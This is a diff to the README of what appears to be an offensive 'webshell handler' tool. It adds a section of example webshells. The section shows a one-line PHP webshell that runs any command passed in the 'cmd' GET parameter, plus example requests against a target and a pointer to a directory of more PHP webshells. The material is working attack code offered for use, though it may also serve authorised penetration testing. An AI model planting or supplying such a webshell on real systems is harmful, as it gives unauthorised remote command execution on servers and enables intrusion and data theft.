@@ -56,15 +56,16 @@ python3 webshell_handler.py <webshell_url> <command_parameter>
 python3 webshell_handler.py http://target/webshell.php cmd
 ```
 
-## Example Webshell
-Example PHP webshell.php used by the handler:
+## Examples of Webshells
+Example simple PHP webshell_system.php that can be used by the handler:
 ```php
 <?php system($_GET['cmd']); ?>
 
 # Example GET request:
-http://target/webshell.php?cmd=id
+http://target/webshell_system.php?cmd=id
 #You can replace 'id' with any other command you want to execute at target system.
 ```
+In webshells_php directory, you can find more examples of webshells written in PHP.
 
 ## Example Commands (Full Handler)
 ```bash
